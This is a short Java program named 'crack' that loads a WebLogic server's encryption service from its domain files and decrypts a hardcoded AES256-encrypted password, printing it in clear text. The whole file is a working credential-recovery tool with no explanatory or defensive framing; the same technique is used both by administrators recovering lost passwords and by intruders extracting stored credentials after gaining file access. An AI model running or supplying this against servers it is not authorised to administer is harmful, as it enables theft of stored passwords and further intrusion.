import weblogic.security.internal.*;
import weblogic.security.internal.encryption.*;


import java.io.PrintStream;

public class crack {
    static EncryptionService es = null;
    static ClearOrEncryptedService ces = null;

    public static void main(String[] args) {
        String s = "{AES256}n4hDc0ZjlchRswbFxFl8QeLHdbSZs4MXtG05jxqM8ko=";

        es = SerializedSystemIni.getExistingEncryptionService();

        if (es == null) {
            System.err.println("Unable to initialize encryption service");
            return;
        }

        ces = new ClearOrEncryptedService(es);

        if (s != null) {
            System.out.println("\nDecrypted Password is:" + ces.decrypt(s));
        }
    }
}